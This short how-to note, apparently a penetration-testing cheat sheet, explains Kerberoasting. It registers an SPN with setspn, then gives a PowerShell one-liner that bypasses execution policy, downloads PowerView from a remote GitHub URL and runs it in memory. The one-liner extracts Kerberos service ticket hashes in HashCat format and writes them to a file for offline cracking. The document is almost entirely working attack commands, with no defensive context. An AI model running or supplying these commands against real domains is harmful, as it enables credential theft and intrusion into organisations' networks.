How to perform Kerberoasting.

Register SPN 

setspn -s http/dc.lab:80 <user_name>

Perform Kerberosting using Powerview Powershell script

powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/nettitude/PoshC2/master/Modules/powerview.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash.txt"
